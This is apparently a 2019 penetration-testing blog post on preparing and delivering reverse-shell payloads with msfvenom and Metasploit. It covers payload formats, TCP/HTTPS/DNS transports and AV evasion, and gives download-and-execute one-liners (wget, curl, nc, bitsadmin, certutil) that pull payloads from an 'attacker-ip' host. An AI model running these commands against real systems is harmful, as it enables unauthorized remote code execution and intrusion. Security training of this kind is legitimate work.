Taken from: https://www.devilsec.io/2019/03/23/pop-all-the-shells/

### Payload Preparation



#### msfvenom --help-formats 

- raw - raw shell source-code based on the payload you choose. ie: php/reverse_php will give you raw php source code. perl/reverse_tcp will give you a raw perl reverse shell script, and so on. Useful for arbitrary PHP upload vulnerabilities, and also for executing a shell via a local script interpreter.
- dll - Windows execution is reflective DLL injection. Windows DLLs are flexible and can be easily injected directly into memory for reliable shell execution, and it automatically is executed in the background as a separate process, which all but guarantees a stable shell.
- elf/exe - Executable binaries for Linux/Windows respectively are very useful and are reliable even in the absence of scripting languages or special privileges. Ordinarily this would run the risk of setting off AV, but we’re not worried about that here.
- java/perl/python/ruby/etc - Normally reserved for exploit development, these language-specific payloads are also applicable, particularly in certain web applications where native code execution can occur. Every now and again, you may find some magical interpreter built into the application. These methods give you the raw bytecode, so to execute it will require the native execution method for that specific language to call the bytecode directly.
- psh-cmd - Create a powershell one-liner with this handy format.
- war - The unassuming “war” file is a java-based executable that commonly accompanies web applications and automation services like those you find on Jenkins and JBoss instances.

#### Shell Transports

    Transport methods are how the session will be set up once the shell executes. 
    The most common one is raw TCP, which can often be the most reliable, 
    but is also the lease resilient against AV and especially network monitors and intrusion prevention systems. 
    For those reasons, you’ll usually need to make use of encapsulation – encryption.

    HTTPS is the most popular for several reasons. 
    HTTP is the most common and most essential type of web-based traffic. 
    It’s unlikely to be blacklisted by firewalls, and even if it is filtered, there are usually ways around it. 
    It’s also extensible, easy to proxy, and encryption is expected. 
    The only problem you may run into is where next-gen firewalls support deep packet inspection (DPI) which effectively amounts to SSL-Stripping.

    DNS transports are less common because they are slow but pretty sneaky when done right. 
    DNS traffic being an essential protocol for normal network operations, DNS is almost never blocked beyond the boundaries of a network. 
    This form of transport works by using this idea to transport communications via DNS request-reply communication over UDP to the attacker’s server, acting as an ordinary DNS server.
    The only reasonable defense for this is if unapproved DNS servers are blocked by network policies. 
    As you can imagine, this is rarely found in production. 
    The main disadvantage is how slow it is, and that it is an unencrypted protocol; however, with the advent of DNS over SSL, this may change in the future. 
    DNSCat is currently the most popular standalone tool for this kind of delivery method, but even metasploit has a few of these available

#### msf5 > search type:payload dns
```
Matching Modules
================

   Name                                                    Disclosure Date  Rank    Check  Description
   ----                                                    ---------------  ----    -----  -----------
   payload/windows/dllinject/reverse_tcp_dns                                normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
   payload/windows/dllinject/reverse_tcp_rc4_dns                            normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/dns_txt_query_exec                                       normal  No     DNS TXT Record Payload Download and Execution
   payload/windows/meterpreter/reverse_tcp_dns                              normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   payload/windows/meterpreter/reverse_tcp_rc4_dns                          normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/patchupdllinject/reverse_tcp_dns                         normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)
   payload/windows/patchupdllinject/reverse_tcp_rc4_dns                     normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/patchupmeterpreter/reverse_tcp_dns                       normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
   payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns                   normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/shell/reverse_tcp_dns                                    normal  No     Windows Command Shell, Reverse TCP Stager (DNS)
   payload/windows/shell/reverse_tcp_rc4_dns                                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/upexec/reverse_tcp_dns                                   normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)
   payload/windows/upexec/reverse_tcp_rc4_dns                               normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/vncinject/reverse_tcp_dns                                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
   payload/windows/vncinject/reverse_tcp_rc4_dns                            normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
```
#### Payload Delivery

Depending on the host and the vulnerability you’re exploiting, figuring out how to get a shell to the target can be the trickest part, especially if you’re limited on payload length or execution methods. Here are the most reliable ways I’ve been able to quickly deliver my shellcode for a stable shell.
Web Delivery

Simple web delivery is the most straight-forward method, and you can open up your own HTTP server without having to configure Apache/Nginx, or anything like that. All you need is cd to the directory you want to share with your targets (I usually create a /tmp/payloads folder) and serve it with this simple python one-liner.
```
cd /tmp/payloads
python2 -m SimpleHTTPServer <port>           // default port: 8888
```
Now that you’ve got your web server running, you need to get your target to download it. With Linux, you have several options:
```
# wget download & pipe to shell
wget -O - http://attacker-ip:8888/payload.sh | sh

# Netcat pipe to file & execute in background
nc attacker-ip:8888/payload.sh > /tmp/payload && /tmp/payload &

# Curl silent download & execute
curl -sL http://attacker-ip:8888/payload.sh | sh
```
Windows is a little less straight-forward, but there are still ample possibilities:
```
# Windows bitsadmin download & execute
cmd.exe /c "bitsadmin /transfer eviljob /download /priority high http://attacker-ip:8888/payload.exe c:\payload.exe & start c:\payload.exe"

# Windows Certutil.exe download a base64-encoded binary
certutil.exe -urlsplit -f
```

